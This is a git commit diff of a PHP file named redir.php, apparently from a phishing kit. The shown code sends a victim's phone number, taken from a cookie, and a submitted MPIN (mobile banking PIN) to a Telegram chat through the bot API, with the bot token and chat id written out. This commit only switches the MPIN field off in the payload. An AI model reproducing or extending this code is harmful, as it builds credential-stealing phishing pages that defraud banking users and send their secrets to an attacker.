7b47a0a7732d06841d29adf2cf682087c70c0bb0
NonNomen404 <92431601+NonNomen404@users.noreply.github.com>
2021-12-09 16:47:29 +0700

    Update redir.php

--- redir.php
+++ redir.php
@@ -4,8 +4,8 @@ file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmH
 // others
 //file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-538746459&text=" . $_COOKIE['number'] . " MPIN: " . $_POST['mpin']);
 
-$mpin = "\n MPIN: " . $_POST['mpin'];
-//$mpin = NULL;
+//$mpin = "\n MPIN: " . $_POST['mpin'];
+$mpin = NULL;
 
 
 $data = [
